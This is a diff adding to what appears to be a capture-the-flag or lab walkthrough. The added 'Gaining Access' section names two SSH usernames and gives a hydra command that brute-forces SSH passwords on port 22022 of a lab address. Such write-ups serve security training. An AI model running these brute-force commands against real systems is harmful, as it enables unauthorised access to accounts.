@@ -55,7 +55,11 @@ Port 22022: OpenSSH 8.4
 
 
 ## Gaining Access:
-
++ SSH is open, and there are 2 valid usernames: sammy adn sunny
++ Brute force the users' credentials using hydra.
+```
+hydra -L users.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt 10.10.10.76 ssh -s 22022 -f
+```
 
 
 ## Privilege Escalation:
